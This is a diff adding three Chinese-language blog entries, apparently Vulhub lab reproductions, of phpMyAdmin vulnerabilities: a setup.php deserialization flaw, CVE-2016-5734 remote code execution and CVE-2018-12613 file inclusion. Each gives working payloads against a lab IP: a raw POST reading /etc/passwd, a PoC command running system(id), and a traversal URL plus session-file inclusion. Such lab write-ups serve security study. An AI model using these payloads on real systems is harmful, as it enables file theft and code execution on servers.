@@ -17,6 +17,81 @@
       </tags>
   </entry>
   <entry>
+    <title>phpmyadmin Scripts/setup.php 反序列化漏洞 (WooYun-2016-199433)</title>
+    <url>/2021/12/13/phpmyadmin%20Scripts-setup.php%20%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96%E6%BC%8F%E6%B4%9E%20(WooYun-2016-199433)/</url>
+    <content><![CDATA[<h1 id="phpmyadmin-Scripts-setup-php-反序列化漏洞-WooYun-2016-199433"><a href="#phpmyadmin-Scripts-setup-php-反序列化漏洞-WooYun-2016-199433" class="headerlink" title="phpmyadmin Scripts/setup.php 反序列化漏洞 (WooYun-2016-199433)"></a>phpmyadmin Scripts/setup.php 反序列化漏洞 (WooYun-2016-199433)</h1><p>受影响的版本：2.x</p>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>访问<code>http://192.168.44.132:8080</code>，您将看到 phpmyadmin 主页。因为没有连接到数据库，我们会得到一个错误。但是这个漏洞与数据库无关，所以直接忽略。</p>
+<p>发送以下包可读取<code>/etc/passwd</code>：</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">POST &#x2F;scripts&#x2F;setup.php HTTP&#x2F;1.1</span><br><span class="line">Host: 192.168.44.132:8080</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Accept: *&#x2F;*</span><br><span class="line">Accept-Language: en</span><br><span class="line">User-Agent: Mozilla&#x2F;5.0 (compatible; MSIE 9.0; Windows NT 6.1; Win64; x64; Trident&#x2F;5.0)</span><br><span class="line">Connection: close</span><br><span class="line">Content-Type: application&#x2F;x-www-form-urlencoded</span><br><span class="line">Content-Length: 80</span><br><span class="line"></span><br><span class="line">action&#x3D;test&amp;configuration&#x3D;O:10:&quot;PMA_Config&quot;:1:&#123;s:6:&quot;source&quot;,s:11:&quot;&#x2F;etc&#x2F;passwd&quot;;&#125;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20211213/1639377835753.png" alt="image-20211213143505299"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>phpmyadmin</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>phpMyAdmin 4.0.x—4.6.2 远程代码执行漏洞 (CVE-2016-5734)</title>
+    <url>/2021/12/13/PhpMyAdmin%204.0.x%E2%80%944.6.2%20%E8%BF%9C%E7%A8%8B%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%E6%BC%8F%E6%B4%9E%20(CVE-2016-5734)/</url>
+    <content><![CDATA[<h1 id="phpMyAdmin-4-0-x—4-6-2-远程代码执行漏洞-CVE-2016-5734"><a href="#phpMyAdmin-4-0-x—4-6-2-远程代码执行漏洞-CVE-2016-5734" class="headerlink" title="phpMyAdmin 4.0.x—4.6.2 远程代码执行漏洞 (CVE-2016-5734)"></a>phpMyAdmin 4.0.x—4.6.2 远程代码执行漏洞 (CVE-2016-5734)</h1><p>phpMyAdmin 是一个用 PHP 编写的免费软件工具，旨在通过 Web 处理 MySQL 的管理。漏洞在<code>preg_replace</code>函数中，因为用户提交的信息可以拼接到第一个参数中。</p>
+<p>在 PHP 5.4.7 之前，<code>preg_replace</code>可以将的第一个参数截断，<code>\0</code>并将搜索模式更改为<code>\e</code>。它可能导致远程代码执行漏洞。</p>
+<p>受影响的版本：</p>
+<ul>
+<li>4.0.10.16 之前的 4.0.x 版本</li>
+<li>4.4.15.7 之前的 4.4.x 版本</li>
+<li>4.6.3之前的4.6.x版本（其实因为这个版本需要PHP5.5+，这个漏洞无法复现）</li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>启动 PHP 5.3 + Apache + phpMyAdmin 4.4.15.6，启动后，访问<code>http://192.168.44.132:8080</code>，您将看到phpMyAdmin的登录页面。登录使用<code>root</code>:<code>root</code>。</p>
+<p>此漏洞需要登录和写入数据的权限。</p>
+<p>我们使用这个 POC（<a href="https://www.exploit-db.com/exploits/40185/）来重现漏洞。" target="_blank" rel="noopener">https://www.exploit-db.com/exploits/40185/）来重现漏洞。</a></p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">python3 cve-2016-5734.py -c &#39;system(id);&#39; -u root -p root -d test http:&#x2F;&#x2F;192.168.44.132:8080&#x2F;</span><br></pre></td></tr></table></figure>
+
+<p><img src="https://image.3001.net/images/20211213/16393775596341.png" alt="image-20211209181834891"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>phpmyadmin</tag>
+      </tags>
+  </entry>
+  <entry>
+    <title>phpmyadmin 4.8.1 远程文件包含漏洞 (CVE-2018-12613)</title>
+    <url>/2021/12/13/phpmyadmin%204.8.1%20%E8%BF%9C%E7%A8%8B%E6%96%87%E4%BB%B6%E5%8C%85%E5%90%AB%E6%BC%8F%E6%B4%9E%20(CVE-2018-12613)/</url>
+    <content><![CDATA[<h1 id="phpmyadmin-4-8-1-远程文件包含漏洞-CVE-2018-12613"><a href="#phpmyadmin-4-8-1-远程文件包含漏洞-CVE-2018-12613" class="headerlink" title="phpmyadmin 4.8.1 远程文件包含漏洞 (CVE-2018-12613)"></a>phpmyadmin 4.8.1 远程文件包含漏洞 (CVE-2018-12613)</h1><p>PhpMyAdmin 是一个用 PHP 编写的免费软件工具，旨在通过 Web 处理 MySQL 的管理。该漏洞位于<code>index.php</code>，导致文件包含漏洞。</p>
+<p>参考链接：</p>
+<ul>
+<li><a href="https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog" target="_blank" rel="noopener">https://mp.weixin.qq.com/s/HZcS2HdUtqz10jUEN57aog</a></li>
+<li><a href="https://www.phpmyadmin.net/security/PMASA-2018-4/" target="_blank" rel="noopener">https://www.phpmyadmin.net/security/PMASA-2018-4/</a></li>
+</ul>
+<a id="more"></a>
+
+<h2 id="漏洞复现"><a href="#漏洞复现" class="headerlink" title="漏洞复现"></a>漏洞复现</h2><p>环境启动后，访问<code>http://192.168.44.132:8080</code>. phpmyadmin 是“config”模式，所以我们可以直接登录。</p>
+<p>访问<code>http://192.168.44.132:8080/index.php?target=db_sql.php%253f/../../../../../../../../etc/passwd</code>，结果表明存在文件包含漏洞：</p>
+<p><img src="https://image.3001.net/images/20211213/16393774972319.png" alt="image-20211209172612893"></p>
+<p>我们可以执行<code>SELECT &#39;&lt;?=phpinfo()?&gt;&#39;;</code></p>
+<p><img src="https://image.3001.net/images/20211213/16393775006611.png" alt="image-20211209173758509"></p>
+<p>然后检查你的 sessionid（cookie 中 phpMyAdmin 的值），然后包含 session 文件：</p>
+<p><img src="https://image.3001.net/images/20211213/16393775064581.png" alt="image-20211209173815624"></p>
+]]></content>
+      <categories>
+        <category>漏洞复现</category>
+      </categories>
+      <tags>
+        <tag>Vulhub复现</tag>
+        <tag>phpmyadmin</tag>
+      </tags>
+  </entry>
+  <entry>
     <title>XDebug 远程调试漏洞（代码执行）</title>
     <url>/2021/12/06/XDebug%20%E8%BF%9C%E7%A8%8B%E8%B0%83%E8%AF%95%E6%BC%8F%E6%B4%9E%EF%BC%88%E4%BB%A3%E7%A0%81%E6%89%A7%E8%A1%8C%EF%BC%89/</url>
     <content><![CDATA[<h1 id="XDebug-远程调试漏洞（代码执行）"><a href="#XDebug-远程调试漏洞（代码执行）" class="headerlink" title="XDebug 远程调试漏洞（代码执行）"></a>XDebug 远程调试漏洞（代码执行）</h1><p>XDebug是PHP的一个扩展，用于调试PHP代码。如果目标开启了远程调试模式，并设置<code>remote_connect_back = 1</code>：</p>
